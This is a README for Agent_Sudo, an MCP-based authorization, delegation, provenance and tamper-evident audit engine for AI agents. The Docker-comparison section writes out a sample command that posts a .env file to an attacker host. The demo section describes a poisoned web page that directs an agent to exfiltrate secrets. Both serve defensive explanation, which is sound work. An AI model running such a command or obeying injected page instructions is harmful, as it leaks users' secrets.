# Agent_Sudo

<p align="center">
  <img src="assets/brand/agent-sudo-logo-readme.png" alt="Agent_Sudo logo" width="320">
</p>

<p align="center">
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg" alt="License"></a>
  <a href="https://pypi.org/project/agent-sudo-mcp/"><img src="https://img.shields.io/pypi/v/agent-sudo-mcp" alt="PyPI version"></a>
  <a href="https://registry.modelcontextprotocol.io/v0/servers?search=agent-sudo-mcp"><img src="https://img.shields.io/badge/MCP%20adapter-published-brightgreen" alt="MCP adapter: published"></a>
</p>

**Give AI agents bounded authority — not unchecked access.**

Agent_Sudo is an **authorization, delegation, provenance, and verifiable-audit engine for AI agents**. AI agents should be able to act on their own — but not without limits, and not without a record. Agent_Sudo lets you define what an agent is *authorized* to do, *delegate* narrow authority that expires on its own, decide each action by the *provenance* of the instruction behind it, and keep a tamper-evident *audit* trail you can verify after the fact.

It runs locally today through the Model Context Protocol (MCP) — the first production-ready adapter and the recommended way to install it. **MCP is how you connect it, not what it is.**

## Isn't this just another approval layer?

No — and that's the point. Claude Code, Cursor, and Codex already ask *"do you approve this action?"* Agent_Sudo answers different questions:

- **Authorization** — what is this agent allowed to do *without* a human in the loop?
- **Delegation** — how do you grant narrow authority (this path, 2 hours, 10 uses) that revokes itself?
- **Provenance** — when an action traces back to *untrusted* content (a fetched web page, a tool result), is it caught because of *where it came from* — not how it's worded?
- **Verifiable audit** — afterward, can you prove what the agent did, and that the log wasn't edited?

Approval prompts are one enforcement step inside that boundary. They are not the product.

## Who it's for

- **Local AI power users** — [Claude Code](docs/integrations/mcp_server_setup.md#claude-code), [Codex CLI](docs/integrations/mcp_server_setup.md#codex-cli), Aider, and other MCP-based agents. Protect secrets, prevent destructive actions, enforce trust boundaries, and keep an accountable record.
- **Agent runtimes & platforms** — embed authorization, scoped delegation, provenance-based decisions, and verifiable audit instead of building them yourself. MCP is the mature adapter today; other runtime integrations exist but are earlier (see [Ecosystem](#ecosystem)).

## What makes it different

- **Provenance-based enforcement** — decisions turn on an instruction's *origin*, so tool calls driven by untrusted content are escalated or denied by where they came from. (This is origin tracking, *not* a prompt-injection text detector.)
- **Scoped, self-expiring delegation** — temporary, resource-limited authority instead of binary allow/deny per click.
- **Verifiable accountability** — every decision is written to a SHA-256 hash-chained log that `agent-sudo verify-audit` can check for tampering.
- **Authorization boundaries** — set what's allowed once; the agent operates autonomously inside the boundary.

> **Scope:** Agent_Sudo governs the tool calls routed *through* it. It is **not** a sandbox, **not** an enterprise platform, and **not** a universal standard. See [Trust Boundaries](#trust-boundaries-what-is-and-is-not-protected) for exactly what it does and does not protect.

---

## See the Difference in ~60 Seconds

The clearest illustration of what Agent_Sudo adds over an approval prompt is **provenance-based enforcement**. An agent reads a poisoned web page that tells it to exfiltrate your `.env`. Agent_Sudo **denies** the action because its **origin is untrusted external content** — not because it parsed the malicious wording — while **allowing** the user's own work, and writes a tamper-evident audit entry. The decision turns on *where the instruction came from*, independent of how the injection is phrased.

![Agent_Sudo provenance-based blocking demo](assets/demo/exfil-demo.gif)

The demo lives in the repository (it is not part of the PyPI package), so clone first:

```bash
git clone https://github.com/Kisyntra/Agent_Sudo
cd Agent_Sudo/examples/exfil_demo && python demo.py
```

Walkthrough and expected output: [`examples/exfil_demo/`](examples/exfil_demo/).

---

## Evaluate Agent_Sudo in 5 Minutes

**One install, one command** — runs the whole boundary (blocked → delegated → allowed once → denied → audit verified) in a throwaway temp directory:

```bash
pipx install agent-sudo-mcp && agent-sudo eval
```

<details>
<summary><b>No pipx? Other ways to install — same package, pick one</b></summary>

```bash
# Option A — pipx (recommended): isolates the tool and puts `agent-sudo` on your PATH everywhere
pipx install agent-sudo-mcp

# Option B — pip + virtualenv: installs into a project-local environment you activate
python3 -m venv venv && source venv/bin/activate
pip install agent-sudo-mcp
```

Both install the **same** PyPI package and give you the same two commands:

- **`agent-sudo`** — the CLI *you* run (`eval`, `audit`, `delegate`, `setup`, …).
- **`agent-sudo-mcp`** — the server your AI client launches for you. You never run this by hand; `agent-sudo setup` wires it into your client (see [MCP Adapter Setup](#mcp-adapter-setup)).

</details>

You should see:

```text
Agent_Sudo Evaluation

[1/5] Blocked unsafe request ........ PASS
[2/5] Created delegation ............ PASS
[3/5] Delegated request allowed ..... PASS
[4/5] Token exhausted, denied again . PASS
[5/5] Audit chain verified .......... PASS

Result: PASS
Audit log: /tmp/agent-sudo-eval-.../audit.jsonl
Next: agent-sudo audit list /tmp/agent-sudo-eval-.../audit.jsonl
```

`agent-sudo eval` runs entirely in a temporary directory (no changes to your `~/.agent-sudo` state), prints where the audit log lives, and exits non-zero if any step fails. For the step-by-step walkthrough, see **[Evaluate Agent_Sudo in 5 Minutes](docs/evaluate_5_minutes.md)**.

### What You Will Validate

- A critical shell request through the Agent_Sudo engine does not execute by default.
- A one-use delegation allows exactly one matching request.
- The same request is denied after the delegation is consumed.
- The decisions are written to a hash-chained audit log that verifies cleanly (`agent-sudo verify-audit`).

---

## MCP Adapter Setup

MCP is how Agent_Sudo connects to your agent — **the wiring, not another install.** You already installed the package in the step above; here `agent-sudo setup` plugs the `agent-sudo-mcp` server into your AI client, which then launches it for you automatically.

Confirm the install and locate the server binary your client will run:

```bash
agent-sudo --version
which agent-sudo-mcp
```

**Beginner path — just run `agent-sudo setup`** and pick your client from the menu; it prints the correct pasteable config:

```bash
agent-sudo setup
#   1. Claude Code
#   2. Codex CLI
#   3. Claude Desktop
#   4. Hermes
#   5. OpenClaw
```

**Advanced / scripted path — name the target directly** (no prompt, CI-friendly):

| Client | One-step setup | Guide |
| :--- | :--- | :--- |
| **Claude Code** | `agent-sudo setup claude-code` prints the `claude mcp add …` command | [Claude Code](docs/integrations/mcp_server_setup.md#claude-code) |
| **Codex CLI** | `agent-sudo setup codex` prints the `~/.codex/config.toml` block | [Codex CLI](docs/integrations/mcp_server_setup.md#codex-cli) |
| **Claude Desktop** | `agent-sudo setup claude-desktop` prints the `claude_desktop_config.json` block | [Claude Desktop](docs/integrations/claude_desktop_setup.md) |

`agent-sudo setup <client>` resolves the absolute `agent-sudo-mcp` path for you. (With no client *and* no terminal — e.g. in CI — `agent-sudo setup` lists the targets and exits non-zero rather than prompting.) Interactive approvals additionally need `agent-sudo init-approval` (see [First Run](docs/first_run.md)); the delegation-based evaluation does not.

For Claude Desktop, add Agent_Sudo at `~/Library/Application Support/Claude/claude_desktop_config.json`, using the absolute path returned by `which agent-sudo-mcp`. Run `agent-sudo setup claude-desktop` to generate this block with paths resolved:

```json
{
  "mcpServers": {
    "agent-sudo": {
      "command": "/ABS/PATH/TO/agent-sudo-mcp",
      "args": [
        "--audit-log", "/ABS/HOME/.agent-sudo/mcp-audit.jsonl",
        "--delegations-file", "/ABS/HOME/.agent-sudo/delegations.json",
        "--pending-approvals-file", "/ABS/HOME/.agent-sudo/pending_approvals.json",
        "--workspace", "/ABS/PATH/TO/your/project",
        "--notify", "--open-approval-terminal"
      ]
    }
  }
}
```

Use absolute paths: the client launches the server from a directory you do not control. **`--delegations-file` is required** — without it the server runs with no delegation store and `agent-sudo delegate create` tokens are silently ignored. `--notify` / `--open-approval-terminal` are macOS-only (no-ops elsewhere). Each flag and value is a separate string in `args`.

Restart Claude Desktop, ask it to use an Agent_Sudo tool, then verify the action was routed through the engine — pass the **same** audit-log path you configured:

```bash
agent-sudo audit list "$HOME/.agent-sudo/mcp-audit.jsonl"
```

If the action is not listed, it bypassed Agent_Sudo. A bare `agent-sudo audit list` reads a *relative* default and will look empty — pass the absolute path. For the full setup and trust-boundary details, see the [Claude Desktop Setup Guide](docs/integrations/claude_desktop_setup.md).

### Platform support

Agent_Sudo's core — **authorization, delegation, provenance, and the tamper-evident audit log** — works the same on **macOS, Linux, and Windows**.

Two *optional* approval-UX flags are **macOS-only today**:

- `--notify` — desktop notification when an approval is pending (macOS `osascript`). There is **no custom notification icon**: the macOS notification shows the invoking process's icon, not an Agent_Sudo logo.
- `--open-approval-terminal` — auto-opens **Terminal.app** running the approval helper (macOS only).

On **Linux and Windows** these flags are silent no-ops, so `agent-sudo setup` **omits them** off macOS. Approve pending actions manually from any terminal:

```bash
agent-sudo pending                 # list pending approval requests
agent-sudo approve <approval_id>   # approve one (critical actions require your passphrase)
```

This manual workflow is the expected path on Linux/Windows and works on macOS too.

---

## Trust Boundaries: What Is and Is Not Protected

Agent_Sudo only sees the tool calls that are **routed through it**. This is the single most important thing to understand before relying on it.

| ✅ Protected | ❌ Not protected |
| :--- | :--- |
| Tool calls made through the `agent-sudo` adapter (file reads/writes, shell, network) — gated, classified, and logged | A client's **own native/built-in tools** (e.g. Claude Desktop's built-in file or web tools) that don't go through Agent_Sudo |
| Any runtime where dangerous tools are disabled or explicitly proxied through the engine | **Other MCP servers** you've installed that expose filesystem/shell/network directly to the agent |
| Intent-level decisions: provenance, approval gates, delegation scopes, audit | OS-level isolation (use Docker/VM for that — see [comparison](docs/comparison/sandboxes.md)) |

**How to make sure you're actually protected:**

1. Route the agent's risky capabilities through the `agent-sudo` adapter (see the [Claude Desktop Setup Guide](docs/integrations/claude_desktop_setup.md)).
2. Disable or remove **other** tools that grant the agent direct file/shell/network access and bypass the engine.
3. **Verify with the audit log.** Ask the agent to perform an action, then run `agent-sudo audit list`. If the action is recorded, it went through Agent_Sudo. **If it is *not* in the log, it bypassed Agent_Sudo and was not protected** — that capability still needs to be disabled or routed through the engine.

This is a deliberate scope choice, not a defect: Agent_Sudo governs *intent and authorization* for the tools it mediates. Pair it with OS-level isolation (Docker/Firecracker) for environment containment.

### What Agent_Sudo Does and Does Not Protect

**What it is:** a policy-and-provenance engine with human approval gates, scoped delegation, and a tamper-evident (hash-chained) audit log — for the tool calls routed through it.

**Protects:**
- **Excessive agency** — sensitive/critical actions (shell, critical file writes, external posts) require human approval before they run.
- **Untrusted-origin actions** — actions whose provenance is external content (e.g. a fetched web page) are escalated or denied based on *where the instruction came from*, not its wording.
- **Tamper-evident audit** — every decision is recorded to a SHA-256 hash-chained log that `agent-sudo verify-audit` can check for after-the-fact edits.
- **Scoped delegation** — temporary, resource-limited tokens grant narrow access that expires automatically.

**Does not protect:**
- **Tools that bypass the engine** — a client's native tools or other MCP servers that don't route through Agent_Sudo are neither gated nor audited.
- **Prompt injection as a content-security problem** — Agent_Sudo does **not** reliably detect injected instructions in prose. The built-in phrase detector is a **best-effort tripwire** that flags a few literal strings; the real protection is provenance-based escalation, not text matching.
- **OS-level isolation** — it is not a sandbox; pair it with Docker/Firecracker for filesystem/process containment.
- **A compromised local environment** — anyone (or any agent) with an **ungoverned local shell** can approve pending actions or edit Agent_Sudo's own control-plane files directly. An agent that can run host-native commands can change the workspace (`agent-sudo workspace set`), delegations, or config to *move* the enforcement boundary instead of routing through it. Disable or route the agent's native shell for the boundary to hold. Workspace changes are now recorded as `workspace_changed` events in the audit log, so a boundary change is visible to `agent-sudo verify-audit` even when it was made outside the engine.

See the [Security & Threat Model](docs/architecture/security_model.md) for the full analysis.

---

## Why Agent_Sudo If I Already Use Docker?

A common question from security engineers and developers is: *"Why do I need a policy engine if I am already isolating my agents in a Docker container, gVisor sandbox, or Firecracker microVM?"*

The difference is a separation of concerns:
*   **Docker/Firecracker/Sandboxes** answer: **"Where can code run?"** They isolate the process from the host operating system, preventing an agent from escaping to your local machine, but they do *not* monitor what the agent is doing inside the sandbox.
*   **Agent_Sudo** answers: **"Is this action authorized?"** It operates at the intent and application logic level, evaluating the context, provenance, and authorization rules of individual actions before execution.

### Practical Examples

Even inside a perfectly isolated Docker container, an agent with raw tool access can:
1.  **Exfiltrate Secrets**: Run `curl -X POST -d @.env https://attacker.example` to leak your API keys. A VM allows outbound network requests by default; Agent_Sudo detects the source trust and target, blocking the exfiltration.
2.  **Write/Inject Code**: Edit your project's `main.py` to insert a backdoor or dependency. While Docker prevents host pollution, it cannot prevent the agent from corrupting your project workspace. Agent_Sudo flags critical file edits and requires human confirmation.
3.  **Perform Social Engineering**: Send automated emails, Slack messages, or Discord alerts to external users containing phishing links under the guise of the agent owner. Agent_Sudo gates communication tools based on user approvals.
4.  **Exceed Delegation Scopes**: An agent running an automated build pipeline might accidentally or maliciously call tools outside its intended scope. Agent_Sudo uses **temporary delegation tokens** to automatically lock the agent out once its quota or time-to-live expires.

These two layers are **complementary**: use Docker/VM sandboxes to isolate environment resources, and use Agent_Sudo to validate tool execution intent. For a detailed technical breakdown, see [Agent_Sudo vs. Container/VM Sandboxes](docs/comparison/sandboxes.md).

---

> [!IMPORTANT]
> **Security Boundaries Notice**:
> - **Engine, Not a Sandbox**: `Agent_Sudo` is a local policy engine; it is **not** an OS-level sandbox or container. It gates tool access but does not isolate filesystem or process resources.
> - **Best-Effort Shell Filtering**: Shell command policy checks are best-effort unless reinforced by OS-level containment or custom runtime sandboxes.
> - **Client Runtime Bypass**: Native tools registered directly in host runtimes (e.g., Eino, Hermes) can bypass `Agent_Sudo` entirely unless those tools are disabled or explicitly routed through the engine.

---

## Core Capabilities

Ordered by what distinguishes Agent_Sudo, with approval gates as one enforcement mechanism among them.

- **Provenance-Based Enforcement**: Classifies each action by the trust of its *origin*. Actions whose instruction traces back to untrusted external content are escalated or denied based on *where they came from*, independent of wording. This is the protection behind the [60-second demo](#see-the-difference-in-60-seconds) — not a prompt-injection text detector.
- **Scoped Delegation**: Issues temporary, resource-limited permission tokens (e.g., allow read access to `/path/to/project` for 2 hours, max 10 uses) that expire automatically — narrow authority an agent can use unsupervised, then loses.
- **Authorization & Protected Reads**: Automatically blocks reads targeting private files such as credentials, configuration folders, and shell startup scripts, and upgrades ordinary file writes to critical status when the target is executable code or configuration.
- **Verifiable Audit Logs**: Records all tool attempts and engine decisions to a local JSONL log secured with a SHA-256 hash chain to detect tampering. Review them with `agent-sudo audit list`, or verify integrity with `agent-sudo verify-audit`.
- **Approval Gates**: Prompts for interactive confirmation (CLI yes/no) on sensitive actions, and requires a local passphrase for critical actions (e.g., running shell commands) — the human-in-the-loop step inside the boundary.
- **MCP Adapter**: Implements the Model Context Protocol to plug directly into Claude Desktop and other MCP clients as a stdio server — the first production-ready way to connect the engine.

---

## Framework Example Templates

Agent_Sudo has pre-built example templates showing in-process integration for major Python agent frameworks. These demonstrate the engine embedded directly, beyond the MCP adapter:

*   ✓ **[OpenAI Agents SDK](examples/openai_agents_sdk/)** — pre-wrapping assistant tool functions.
*   ✓ **[PydanticAI](examples/pydantic_ai/)** — **canonical end-to-end dogfood**: a real (deterministic, offline) agent loop driving engine decisions, real file I/O, scoped delegation, and verified audit.
*   ✓ **[LangGraph](docs/examples/langgraph.md)** — securing tool node execution and graph states ([examples/langgraph_integration.py](examples/langgraph_integration.py)).
*   ✓ **[agent-runtimes](examples/agent_runtimes/)** — registering the local tool hooks handler in config.

---

## Additional Demos

### Built-In Policy Demo

Run a local dry-run policy demo:

```bash
agent-sudo demo
```

This is useful for seeing policy decisions quickly. It is not the primary activation path because it does not show the full deny → delegate → allow once → deny exhausted loop.

The full evaluation flow and the broader integration guides are reference material after the [60-second demo](#see-the-difference-in-60-seconds) and the [5-minute evaluator path](#evaluate-agent_sudo-in-5-minutes) succeed.

---

## Contributor Setup

If you are developing `Agent_Sudo` or integrating it with a custom runtime:

```bash
# Clone the repository
git clone https://github.com/Kisyntra/Agent_Sudo.git
cd Agent_Sudo

# Install in editable mode
python3 -m pip install -e .
```

To run unit tests:
```bash
python3 -m unittest discover -s tests
```

---

# Ecosystem

MCP is the production-ready adapter today. Other runtime integrations exist at varying maturity — we work with agent runtime maintainers and external implementers to define portable authorization and audit patterns. Maturity is stated honestly below; this is not broad runtime adoption yet.

*   **Production-ready adapter**:
    *   **MCP** — published as `io.github.Kisyntra/agent-sudo-mcp`. [PyPI](https://pypi.org/project/agent-sudo-mcp/) • [Official MCP Registry](https://registry.modelcontextprotocol.io/v0/servers?search=agent-sudo-mcp) • [Glama listing](https://glama.ai/mcp/servers/Kisyntra/Agent_Sudo).
*   **Merged integrations**:
    *   **[agent-runtimes](https://github.com/datalayer/agent-runtimes)** — local plugin hook handler (`agent_sudo_local`), merged in PR #98.
*   **In progress**:
    *   **[LexFlow](https://github.com/VforVitorio/LexFlow)** — design review (#124) for native JS/TS client audit logging and verification.
*   **Research / local PoC**:
    *   **[Hermes](https://github.com/NousResearch/hermes-agent)** — experimental architecture research (#34992) targeting registry-level dispatch gating.

For the full compatibility matrix and integration details, see the [Ecosystem Status Guide](docs/ecosystem/ecosystem_status.md).

---

## Documentation Directory

| Directory / Section | Topic | Key Files |
| :--- | :--- | :--- |
| **Evaluation** | First-time activation path | [Evaluate in 5 Minutes](docs/evaluate_5_minutes.md) • [First Run Reference](docs/first_run.md) |
| **CLI Reference** | Every command, when to use it, common mistakes | [Command Reference](docs/command_reference.md) |
| **Troubleshooting** | Diagnostics and resolution steps | [docs/troubleshooting.md](docs/troubleshooting.md) |
| **Integrations** | Connecting to runtimes and IDEs | [docs/integrations/overview.md](docs/integrations/overview.md) • [Ecosystem Status](docs/ecosystem/ecosystem_status.md) • [Outreach Playbook](docs/ecosystem/outreach_playbook.md) • [Adoption Dashboard](docs/ecosystem/adoption_dashboard.md) • [Discoverability Notes](docs/ecosystem/discoverability_notes.md) • [LexFlow Readiness](docs/ecosystem/lexflow_readiness.md) • [LexFlow Checklist](docs/ecosystem/lexflow_compatibility_checklist.md) • [Claude Desktop](docs/integrations/claude_desktop_setup.md) • [MCP Setup](docs/integrations/mcp_server_setup.md) • [agent-runtimes](docs/integrations/agent-runtimes.md) • [Hermes (Research)](docs/integrations/hermes-research.md) |
| **Framework Integrations** | Direct SDK gating for agent frameworks | [LangGraph Integration Guide](docs/examples/langgraph.md) • [examples/langgraph_integration.py](examples/langgraph_integration.py) |
| **Architecture** | Abstractions and core pipelines | [docs/architecture/overview.md](docs/architecture/overview.md) • [Layered Architecture](docs/architecture/layered_architecture.md) • [Enforcement Model](docs/architecture/enforcement_model.md) |
| **Specifications** | Language-agnostic models | [spec/runtime_compatibility_levels.md](spec/runtime_compatibility_levels.md) • [Universal Schema](spec/universal_schema.md) • [Policy & Audit](spec/policy_audit_schema.md) • [Interoperability Test Kit](docs/interop/interoperability_test_kit.md) |
| **Security** | Threat modeling and limits | [docs/architecture/security_model.md](docs/architecture/security_model.md) |
| **Comparisons** | Policy vs Container Sandboxes | [Docker & Firecracker comparison](docs/comparison/sandboxes.md) |

---

## CI/CD & Release Automation

`Agent_Sudo` uses GitHub Actions to automate checks and distribution:
- **Continuous Integration**: The CI workflow runs on all pushes and pull requests targeting the `main` branch, running the unittest suite, scanning for personal path disclosures, executing `git diff --check` whitespace validation, and verifying Python package compilation.
- **Automated Releases**: Releases are generated automatically when a git tag matching `v*` is pushed.
  - Release candidate tags (e.g. `v0.4.0-rc12`) are published as GitHub Prereleases and are explicitly excluded from being marked as the latest release.
  - Release notes are automatically parsed and extracted from the matching version entry in `CHANGELOG.md`.

<!-- mcp-name: io.github.Kisyntra/agent-sudo-mcp -->
